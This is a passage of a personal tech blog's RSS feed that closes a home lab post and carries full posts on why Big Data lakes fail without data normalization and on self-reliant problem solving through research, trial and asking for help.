<p>A lot of these use cases are evolving. For example, I set up ELK stack mostly to play around with it and to refresh my knowledge since I&rsquo;d been away from it for a while, but it&rsquo;s not particularly useful for an environment my size outside of tinkering.</p>
<h1 id="how-do-i-keep-track-of-all-these-things">How do I keep track of all these things?</h1>
<p>Fortunately, this is pretty simple to answer. Ansible handles basically everything for me, pulling my configs from my (currently private) GitHub repositories and syncing them across all machines where they&rsquo;re needed.</p>
<p>I&rsquo;ve got a goal of eventually making all of that public, but want to be sure it doesn&rsquo;t have too much information in it regarding my network/services/configurations.</p>
<h1 id="whats-next-for-my-home-lab">What&rsquo;s next for my home lab?</h1>
<p>As you&rsquo;ve probably guessed, the possibilities here are somewhat endless, but here&rsquo;s a high level overview of what I&rsquo;m looking to do with over the next couple of months/years:</p>
<ul>
<li>Hardware
<ul>
<li>Update my router with a more powerful configuration (e.g. Unifi devices)</li>
<li>Replace my NAS with something more modern (e.g. Synology 4 or 5 bay NAS)</li>
</ul>
</li>
<li>Software/Use cases
<ul>
<li>RTSP server for home security cameras</li>
<li>Replace various VMs with Docker containers to both free up resources and to gain further experience working with Docker</li>
<li>Further automation with Ansible to cover as many software configurations as possible</li>
</ul>
</li>
</ul>
<h1 id="where-can-i-learn-more">Where can I learn more?</h1>
<ul>
<li><a href="https://www.reddit.com/r/homelab/">https://www.reddit.com/r/homelab/</a></li>
<li><a href="https://www.reddit.com/r/HomeNetworking/">https://www.reddit.com/r/HomeNetworking/</a></li>
</ul>
]]></content></item><item><title>Draining the (Big Data) Swamp</title><link>https://www.maclaren.dev/posts/2018-07/draining-the-big-data-swamp/</link><pubDate>Tue, 24 Jul 2018 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2018-07/draining-the-big-data-swamp/</guid><description>Before we dive too far into this article, let&amp;rsquo;s define a few key terms that will come up at several points:
Big Data - Technology relating to the storage, management, and utilization of &amp;ldquo;Big Data&amp;rdquo; (e.g. enormous amounts of data/petabyte scale). Data Lake - A common term to refer to a storage platform for Big Data. In this case, let&amp;rsquo;s assume Apache Hadoop (HDFS) or Amazon S3. Data Warehouse - A large store of data sourced from a variety of sources within a company, then used to guide management or business decisions.</description><content type="html"><![CDATA[<p>Before we dive too far into this article, let&rsquo;s define a few key terms that will come up at several points:</p>
<ul>
<li><code>Big Data</code> - Technology relating to the storage, management, and utilization of &ldquo;Big Data&rdquo; (e.g. enormous amounts of data/petabyte scale).</li>
<li><code>Data Lake</code> - A common term to refer to a storage platform for Big Data. In this case, let&rsquo;s assume Apache Hadoop (HDFS) or Amazon S3.</li>
<li><code>Data Warehouse</code> - A large store of data sourced from a variety of sources within a company, then used to guide management or business decisions.</li>
<li><code>ETL</code> - Extract, Transform, Load. The process of taking data from one source, making changes to it, and loading it into another location. The underpinning of Master Data Management, and basically all data movement.</li>
<li><code>Master Data Management (MDM)</code> - The concept of merging important data into a single point of reference. For a lot of Big Data applications, this means tying data back to a single person or actor.</li>
</ul>
<h1 id="now-with-that-out-of-the-way-why-on-earth-is-the-name-of-this-article-talking-about-a-data-swamp">Now with that out of the way&hellip; why on earth is the name of this article talking about a Data Swamp?</h1>
<p>Coming from the RDBMS/data warehouse world - data normalization and MDM is a critical part of any project involving data. Generally there will be some source system that is feeding data in that is then &ldquo;cleaned&rdquo; (or normalized) to reduce duplication/inconsistencies and is then fed into a data warehouse which is used for reporting.</p>
<p>Let&rsquo;s say that you&rsquo;re handling data coming in from two ubiquitous Microsoft platforms - Active Directory and Exchange. Both of these have relatively consistent logging formats to track access, or at least to track behaviour, but where things get different quickly is who they say is accessing things.</p>
<p>With Active Directory logs (let&rsquo;s just say evtx format for the sake of argument), you&rsquo;ll see the account name as <code>DOMAIN\User</code>, or in some cases <code>user@domain.com</code>. With Exchange, however, you&rsquo;re going to see data coming in under the user&rsquo;s email address or, if there&rsquo;s no authentication configured, whatever email address was specified as the sender&hellip; in some cases this is going to be <code>user@domain.com</code> however frequently it can also be <code>firstname.lastname@domain.com</code> or any other infinite number of ways that an organization chooses to reference email addresses.</p>
<p>To put this into a more real world example, at a company I used to work with my login for the domain was in the format of a country code and employee ID, e.g. <code>CA123456</code>, so AD would track me under that ID and only that ID. At that same company I had two email addresses - <code>tdn@company.com</code>, and <code>thedatanewbie@company.com</code> (short name and long name). See where this gets confusing!?</p>
<h1 id="ok-now-i-understand-that-data-is-a-mess-whats-your-point">OK, now I understand that data is a mess&hellip; What&rsquo;s your point?</h1>
<p>Now picture yourself on the receiving end of those logs and trying to piece this all together into a working scenario where you can say that I logged in at 8AM at my normal office place and send out fifteen emails to thirty recipients&hellip; That&rsquo;s where MDM comes into play!</p>
<p>Despite the seemingly strange approach, there&rsquo;s usually a method to the madness in this sort of thing. Generally all of these items are referenced together in some place&hellip; generally an Active Directory user profile or some LDAP based equivalent. Easy to use, right!? Maybe&hellip;</p>
<p>Attributes in an LDAP profile can be public, meaning anyone who can do a lookup on the user can see them, or they can be private which means that you have to be authorized to see them. In a lot of cases the public attributes are only going to be group memberships, a real name, and the user name - this leaves a lot out to dry.</p>
<p>Let&rsquo;s assume, though, that we have privileged access and can now read all the attributes - we&rsquo;ve got our source of truth! Fantastic! Let&rsquo;s ignore the logistics of trying to maintain up to date LDAP lookups on demand for tens of thousands of users, let alone hundreds of thousands, and move on&hellip;</p>
<p>At this point a consulting team that gets paid lots of money is going to implement some sort of ETL pipeline that pulls data from the source system, does enrichment to tie this all to the &ldquo;one true version&rdquo; of a user, and then loads it into the Data Warehouse which will be used for reporting.</p>
<h1 id="this-all-sounds-great-weve-identified-how-to-enrich-the-data-ignoring-the-logistics-of-doing-so-and-now-youve-got-a-data-warehouse-you-can-report-off-of">This all sounds great! We&rsquo;ve identified how to enrich the data (ignoring the logistics of doing so), and now you&rsquo;ve got a Data Warehouse you can report off of!</h1>
<p>Absolutely, it is great, but here is where we get back to the title of this article! Everything I just described is extremely common in the relational database world (e.g. Oracle, MS SQL Server, etc&hellip;) for reporting with products like Cognos, Qlik, etc&hellip; but unfortunately it is a concept that seems to be routinely ignored in the Big Data world.</p>
<p>As noted earlier, a lot of people will take these logs from many places and store them in their Data Lake for future use/analysis/etc&hellip; While it&rsquo;s great that they get stored, what this means is that you&rsquo;ve got likely petabytes worth of data that you&rsquo;re paying to store but are not using for anything and could not effectively use for anything that would not be extremely resource intensive to implement.</p>
<h1 id="this-is-why-big-data-implementations-fail">This is why Big Data implementations fail!</h1>
<p>Big Data is expensive, and its complex&hellip; it&rsquo;s the perfect storm of hard to do! With this said, all of the same concepts we talked about earlier still apply, they just have to be done differently! Running data through an ETL tool designed for an RDBMS that maybe operates on a total of 24 CPU cores and 128GB of RAM isn&rsquo;t going to cut it when you&rsquo;re dealing with enterprise levels of log files.</p>
<p>This is where I say it&rsquo;s expensive - not only do you need to have the expertise and knowledge of which tooling to use and how to use it, you need be willing to pay to make it happen. In a lot of cases for an enterprise handling authentication logs, email logs, endpoint logs, firewall logs, etc&hellip; this is going to be manifesting its self in the many dozens of CPU cores and hundreds of gigabytes of memory just to do the normalization. You can quickly see why there&rsquo;s hesitation to do this - who wants to spend upwards of half a million dollars on something that&rsquo;s just changing a user name in a log file!?</p>
<p>Unfortunately, without spending that money, those logs that are sitting in S3 (despite it being really cheap) are not really going to be useful if you want to use them down the road. This is where you wind up with the eponymous Data Swamp - a very murky lake full of data.</p>
<p>Many Data Lakes get set up as part of security initiatives so that there can be a postmortem on a breach, or even used proactively in the world of UEBA and Security Analytics, but without this MDM work (and in many cases even basic normalization) that company is going to wind up with the following challenges, to name a few:
Weeks or months of time spent identifying the characteristics and &ldquo;shapes&rdquo; of the data that is stored in the data lake.
The same cost that would have been incurred originally to now perform that MDM work (but under a time crunch).
Added costs and stress of trying to expedite an implementation of something to analyze the logs, or to have their security team(s) manually review them in a SIEM style tool like Splunk.
Really, it just circles back to what could have been done in the first place, and what would have allowed that company to have proactive tools in place, but even past that do immediate manual analysis or rules-based analysis of the data that was stored without having to incur all of the additional costs, stress, and time taken to do so after the fact.</p>
<h1 id="youre-painting-a-pretty-dire-picture-are-all-big-data-implementations-like-this">You&rsquo;re painting a pretty dire picture&hellip; Are all Big Data implementations like this?</h1>
<p>NO! Thank goodness they are not, but the ones that fail all seem to have the same characteristics.</p>
<ul>
<li>No willingness to spend (usually this turns into all of this data living in S3 because it&rsquo;s cheap).</li>
<li>Limited forethought into the end use case (e.g. SIEM, Security Analytics, etc&hellip;).</li>
<li>No dedicated team for the platform, and thus no one to enable the end use case.</li>
</ul>
<p>The ones that are successful, however, tend to have done the following:</p>
<ul>
<li>Brought in, or hired, the expertise to handle the data movement and transformation, and continue to engage with those teams if they are not permanent.</li>
<li>Implement(ed) the Data Lake with a specific goal in mind, and identified the work required to make that happen.</li>
<li>Engaged with, or at least consulted, vendors that would enable the use case once the data was available.</li>
</ul>
<h1 id="lets-wrap-this-up">Let&rsquo;s wrap this up.</h1>
<p>Is this technically easy? Absolutely not. It&rsquo;s not easy even in the RDBMS world where a few dozen gigabytes of sales data across 500 retails stores is considered a huge volume of data to report off of. What I&rsquo;m saying at the end of this is that conceptually it&rsquo;s something that seems to get missed in a lot of Big Data implementations, and there are a lot of folks out there who have been blasting Big Data/Hadoop implementations for years despite the fact that a lot of those issues can be tied back to this at the end of the day.</p>
<p>If this struck a chord with you, and it&rsquo;s something you&rsquo;re having trouble with, keep an eye on this blog and the associated YouTube channel. We&rsquo;re going to be taking a look at a bunch of technology that enables this whole thing to work - Kafka, NiFi, Elasticsearch, Hadoop, etc&hellip; there&rsquo;s no shortage of platforms to let you do this work, and even choosing the &ldquo;wrong&rdquo; one generally won&rsquo;t hamstring you too much, but you have to make that leap to get started!</p>
]]></content></item><item><title>Being Self-Reliant with Technology</title><link>https://www.maclaren.dev/posts/2018-04/self-reliant/</link><pubDate>Fri, 20 Apr 2018 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2018-04/self-reliant/</guid><description>Let&amp;rsquo;s talk about &amp;ldquo;self-reliance&amp;rdquo; as it relates to career and learning. The three aspects of this we&amp;rsquo;re going to discuss are:
Research Failure Asking for Help Research You&amp;rsquo;re sitting at your desk, and you&amp;rsquo;ve got a piece of code that isn&amp;rsquo;t working, or some other challenge&amp;hellip; it&amp;rsquo;s not even technical! You&amp;rsquo;re stuck and you&amp;rsquo;ve run out of ideas, so you need to turn somewhere else for answers.
The first instinct of many people in this situation is to simply ask someone else, but I virtually guarantee that others have already done that, and you can likely find your answer on Google!</description><content type="html"><![CDATA[<p>Let&rsquo;s talk about &ldquo;self-reliance&rdquo; as it relates to career and learning. The three aspects of this we&rsquo;re going to discuss are:</p>
<ul>
<li>Research</li>
<li>Failure</li>
<li>Asking for Help</li>
</ul>
<h1 id="research">Research</h1>
<p>You&rsquo;re sitting at your desk, and you&rsquo;ve got a piece of code that isn&rsquo;t working, or some other challenge&hellip; it&rsquo;s not even technical! You&rsquo;re stuck and you&rsquo;ve run out of ideas, so you need to turn somewhere else for answers.</p>
<p>The first instinct of many people in this situation is to simply ask someone else, but I virtually guarantee that others have already done that, and you can likely find your answer on Google! Obvious, right!?</p>
<p>The problem many people encounter when turning to Google (or any form of research like this) is that they will try to be too specific in what they are looking for, and a lot of the time it will result in little to nothing being found. What you can do, instead, is search for variations of your issue - for example, take parts of an error message or the error code so that you can get a broad understanding of what you could be looking at.</p>
<p>For tech purposes, Stack Overflow is a common resource that people will turn to directly, or which will come up in searches. Very frequently, you&rsquo;ll find an answer to your question on Stack Overflow, but it may not be the answer. By this I mean that the solution you find may work, but it may not be the most efficient way to address the problem.</p>
<p>The goal of your research should not only be to find an answer, but to learn from the plethora of information you find so that you can determine the best approach forward.</p>
<h1 id="failure">Failure</h1>
<p>Next up, we&rsquo;re going to about failure.</p>
<p>Isn&rsquo;t this what got us here to start!? Yes, but it&rsquo;s also the best way to learn!</p>
<p>Continuing with the example of some broken code - you&rsquo;ve now done some research, found ten or twenty different ways to code around the problem, and now you need to implement those and find out:</p>
<ul>
<li>Do they work?</li>
<li>Which is the best for your purposes?</li>
<li>What can you change to make it work even better?</li>
</ul>
<p>It may seem intuitive that you want to test your code before using it in the real world, but this meme exists for a reason:</p>
<p><img src="https://msdnshared.blob.core.windows.net/media/MSDNBlogsFS/prod.evol.blogs.msdn.com/CommunityServer.Blogs.Components.WeblogFiles/00/00/01/32/02/metablogapi/8054.image_thumb_35C6E986.png" alt="test in production"></p>
<p>Work in your local (or cloud based) development environment, break things until you find what works best!</p>
<h1 id="asking-for-help">Asking for Help</h1>
<p>We&rsquo;ve done research, and now we&rsquo;ve tried, and failed, to solve the problem. On the plus side, we&rsquo;ve learned a ton about the situation and some ways to address and avoid similar problems in the future, but are still stuck&hellip; it&rsquo;s time to ask for help!</p>
<p>Yes, you could have started out with this, but the reason it&rsquo;s the last step is that the goal here isn&rsquo;t only to solve a problem - it&rsquo;s to learn from solving it. The great part about having done your research, and having tried things, is that you&rsquo;ve not only saved yourself time in the future but you&rsquo;re going to save time for the person you&rsquo;re going to be asking as well.</p>
<p>The first questions that you will get almost every time when asking for help are &ldquo;What&rsquo;s the issue, and what have you tried?&rdquo;.</p>
<p>By having tried many things and researched before involving someone else and using their time, you can answer this with an educated statement around what has not worked, what may have gotten you part of the way toward an answer, and what you think might be the path forward.</p>
<p>Chances are that the person you&rsquo;re asking for help already is going to follow, or already has in their past experience, the exact same steps here. It&rsquo;s due to this experience, that you&rsquo;re now trying to build, that you&rsquo;ll be able to work together to get a quick and good solution.</p>
<h1 id="wrap-up">Wrap-up</h1>
<p>I know this all seems like it&rsquo;s common sense, but you&rsquo;d be surprised at how many people skip this process and just jump to asking other people - especially skipping the &ldquo;Failure&rdquo; after not finding an exact answer after some preliminary research. At the end of the day, yes, getting your solution was slower than just asking, but think of all of the time that you&rsquo;ve now saved yourself in the future, as well as the time that would have been working through these same steps with someone else.</p>
]]></content></item></channel></rss>